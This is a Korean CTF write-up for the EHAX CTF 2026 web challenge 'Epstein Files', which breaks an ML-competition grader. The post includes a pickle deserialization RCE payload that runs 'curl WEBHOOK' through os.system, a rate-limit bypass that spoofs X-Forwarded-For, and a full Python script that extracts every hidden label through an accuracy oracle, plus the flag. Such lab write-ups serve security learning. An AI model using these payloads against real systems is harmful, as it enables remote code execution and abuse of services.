---
title: "[Web] Epstein Files"
description: Writeup for "Epstein Files" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Epstein Files (EHAX CTF 2026)

---

- **Name:** Epstein Files
- **Category:** Web
- **Difficulty:** ★★★☆☆ (312 points, 98 solves / 887 teams)
- **Connection:** `http://chall.ehax.in:4529`
- **Flag format:** `EH4X{...}`

---

### 개요

Kaggle 스타일의 ML 대회처럼 생긴 서비스입니다.
`train.csv`와 `test.csv`가 주어지고,
예측 결과를 제출하면 정확도(%)를 알려줍니다.

문제 설명이 이렇습니다.

> *"your model to be actually epstein worthy
> you need to get accuracy of 0.69"*

처음엔 ML 문제처럼 보입니다.
그런데 100% 정확도를 내도 `STATUS // SUB-OPTIMAL`이 뜹니다.
**정확히 69%**여야 플래그가 나옵니다.

어떻게 정확히 69%를 맞출 수 있을까요?
그러려면 정답 레이블을 전부 알아야 합니다.
이게 진짜 문제입니다.

---

### 소스 분석

#### 서버 구조 파악

HTML 소스와 응답 헤더를 보면 구조가 보입니다.

| 항목 | 내용 |
|------|------|
| 서버 | Express (Node.js) |
| 제출 | `POST /submit`, 필드명 `submission` |
| 허용 파일 | `.csv` 또는 `.pkl` |
| 레이트 리밋 | IP당 분당 5회 |
| 데이터 | `/data/train.csv`, `/data/test.csv` |

응답 예시:

```html
<title>Epstein Comp | Result: 94.00%</title>
```

매 제출마다 **정확도가 정수 퍼센트로** 돌아옵니다.
이 숫자가 오라클이 됩니다.

#### Pickle RCE 시도

`.pkl` 파일도 받으니까 Pickle 역직렬화 RCE를 먼저 시도합니다.

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl WEBHOOK',))

with open("payload.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
```

올려봐도 전부 500 에러입니다.
서버가 Python 서브프로세스로 처리하는 것 같고,
실제로 unpickle을 하지 않는 것으로 보입니다.
이 경로는 막혔습니다.

---

### 취약점 분석

두 가지 취약점이 맞물립니다.

#### 취약점 1 — X-Forwarded-For 레이트 리밋 우회

서버가 클라이언트 식별에 `X-Forwarded-For` 헤더를 그대로 신뢰합니다.

```http
POST /submit HTTP/1.1
X-Forwarded-For: 1.2.3.4
```

이 헤더를 요청마다 다르게 바꾸면
IP당 5회 제한을 완전히 우회할 수 있습니다.
사실상 **무제한 제출**이 가능해집니다.

#### 취약점 2 — 정확도 오라클

무제한 제출 + 매번 정확도 피드백.
이 두 조건이 합쳐지면 **오라클 공격**이 가능합니다.

핵심 아이디어는 이렇습니다.
현재 정확도를 94%/93% **경계**에 딱 맞춰 놓고,
아이템 하나의 예측을 뒤집어 봅니다.

```
예측을 뒤집었을 때 정확도가 93%로 내려갔다
→ 원래 예측이 맞았다 (틀리게 만들었으니 떨어짐)

예측을 뒤집었을 때 정확도가 94%로 올라갔다
→ 원래 예측이 틀렸다 (맞게 바꿨으니 올라감)
```

한 번의 제출 = 아이템 하나의 정답 여부.
2276번 반복하면 **전체 정답 레이블**을 알 수 있습니다.

---

### Exploit 실행 과정

4단계로 진행합니다.

**Phase 1 — ML 베이스라인 (~94%)**

train.csv를 분석해서 규칙 기반 분류기를 만듭니다.

```python
for row in test:
    cat = row.get("Category", "")
    bio = row.get("Bio", "").lower()
    pred = 0
    if "black book" in bio:
        pred = 1
    elif cat in ["socialite", "celebrity", "royalty",
                 "business", "politician"]:
        pred = 1
    # ...
```

제출하면 약 94%가 나옵니다.

**Phase 2 — 경계 설정**

`associate`, `military-intelligence` 카테고리에서
바이오에 "black book"이 없는 항목들을
일부러 틀리게 뒤집어서 정확도를 93%와 94% 사이 경계에 맞춥니다.

**Phase 3 — 오라클 공격 (~2300회 제출)**

```python
for i in range(N):
    probe = boundary.copy()
    probe[i] = 1 - probe[i]  # i번째만 뒤집기
    r = submit(probe)         # X-Forwarded-For 로테이션

    if r["acc"] == 93:
        truth[i] = boundary[i]      # 원래 예측이 맞음
    elif r["acc"] == 94:
        truth[i] = 1 - boundary[i]  # 원래 예측이 틀림
```

약 10~15분 후 2276개 레이블을 전부 파악합니다.
제출하면 100%가 나옵니다.

**Phase 4 — 정확히 69% 제출**

```python
# 2276 × 0.69 ≈ 1570개 맞춰야 함
# → 706개를 일부러 틀리게 뒤집기
target_correct = int(N * 0.69)
wrong_needed = N - target_correct

final = truth.copy()
for i in range(wrong_needed):
    final[i] = 1 - final[i]

submit(final)  # → DECLASSIFIED DATA 페이지 + 플래그
```

실행 결과:

```
EH4X{epst3in_d1dnt_k1ll_h1ms3lf_but_th1s_m0d3l_d1d}
```

---

### Exploit 코드 (Python)

<details>
<summary>전체 코드 펼치기</summary>

```python
#!/usr/bin/env python3
import csv, subprocess, re, sys, os

TARGET = "http://chall.ehax.in:4529"
ip_counter = 0

def submit(preds):
    global ip_counter
    ip_counter += 1
    ip = (f"{(ip_counter >> 16) & 255}."
          f"{(ip_counter >> 8) & 255}."
          f"{ip_counter & 255}.1")

    with open("/tmp/payload.csv", "w") as f:
        f.write("In Black Book\n")
        for p in preds:
            f.write(f"{p}\n")

    r = subprocess.run(
        ["curl", "-s",
         "-H", f"X-Forwarded-For: {ip}",
         "-F", "submission=@/tmp/payload.csv",
         f"{TARGET}/submit"],
        capture_output=True, text=True, timeout=15,
    )

    m = re.search(r"(EH4X\{[^}]+\}|EHAX\{[^}]+\})", r.stdout)
    if m:
        return {"flag": m.group(1)}

    m = re.search(r"Result: ([\d.]+)%", r.stdout)
    if m:
        return {"acc": int(float(m.group(1)))}
    return {"acc": None}

# 데이터 다운로드
for name in ["train.csv", "test.csv"]:
    if not os.path.exists(name):
        subprocess.run(["curl", "-s", "-o", name,
                        f"{TARGET}/data/{name}"])

with open("train.csv") as f:
    train = list(csv.DictReader(f))
with open("test.csv") as f:
    test = list(csv.DictReader(f))
N = len(test)

# Phase 1 — 베이스라인
ml_preds = []
for row in test:
    cat = row.get("Category", "")
    bio = row.get("Bio", "").lower()
    aliases = row.get("Aliases", "[]")
    conns = int(row.get("Connections", 0))
    pred = 0
    if "black book" in bio or "listed in epstein" in bio:
        pred = 1
    elif cat in ["socialite", "celebrity", "royalty",
                 "business", "politician"]:
        pred = 1
    elif cat == "other":
        if aliases not in ["[]", "", "['']"] or conns >= 2:
            pred = 1
    elif cat in ["associate", "academic", "legal"]:
        if "black book" in bio:
            pred = 1
    ml_preds.append(pred)

r = submit(ml_preds)
print(f"베이스라인: {r.get('acc')}%")

# Phase 2 — 경계 설정
confident_zeros = [
    i for i, row in enumerate(test)
    if ml_preds[i] == 0
    and row.get("Category", "") in [
        "associate", "military-intelligence"
    ]
    and "black book" not in row.get("Bio", "").lower()
]

boundary = ml_preds.copy()
flipped = set()
for idx in confident_zeros:
    boundary[idx] = 1 - boundary[idx]
    flipped.add(idx)
    r = submit(boundary)
    if r.get("acc") is not None and r["acc"] <= 93:
        boundary[idx] = 1 - boundary[idx]
        flipped.discard(idx)
        break

print(f"경계 설정 완료 ({len(flipped)}개 뒤집음)")

# Phase 3 — 오라클 공격
truth = [0] * N
for i in range(N):
    probe = boundary.copy()
    probe[i] = 1 - probe[i]
    r = submit(probe)
    acc = r.get("acc")

    if acc == 93:
        truth[i] = boundary[i]
    elif acc == 94:
        truth[i] = 1 - boundary[i]
    else:
        truth[i] = ml_preds[i]

    if (i + 1) % 500 == 0:
        print(f"  {i+1}/{N} 완료")

r = submit(truth)
print(f"정답 추출 완료: {r.get('acc')}%")

# Phase 4 — 정확히 69% 제출
target_correct = int(N * 0.69)
wrong_needed = N - target_correct
final = truth.copy()
for i in range(wrong_needed):
    final[i] = 1 - final[i]

r = submit(final)
if "flag" in r:
    print(f"\n[+] FLAG: {r['flag']}")
else:
    print(f"결과: {r}")
```

</details>

---

### FLAG

```
EH4X{epst3in_d1dnt_k1ll_h1ms3lf_but_th1s_m0d3l_d1d}
```

---

### 요약

이 문제의 핵심은 **"ML 문제처럼 보이지만 웹 취약점 문제"** 라는 점입니다.

`X-Forwarded-For`를 신뢰하는 레이트 리밋 구현이
무제한 제출을 가능하게 합니다.
여기에 정확도 피드백이 오라클이 되어,
경계값 기법으로 아이템 하나당 한 번의 제출로
정답 레이블을 전부 추출할 수 있습니다.

마지막 반전은 "최고 정확도"가 아닌 **"정확히 69%"** 라는 조건입니다.
정답을 전부 알고 있어야만 원하는 정확도를 정밀하게 맞출 수 있습니다.

```
X-Forwarded-For 우회
       ↓
  무제한 제출
       ↓
  오라클 공격
       ↓
 100% 정답 확보
       ↓
  정확히 69% 제출
       ↓
      FLAG
```
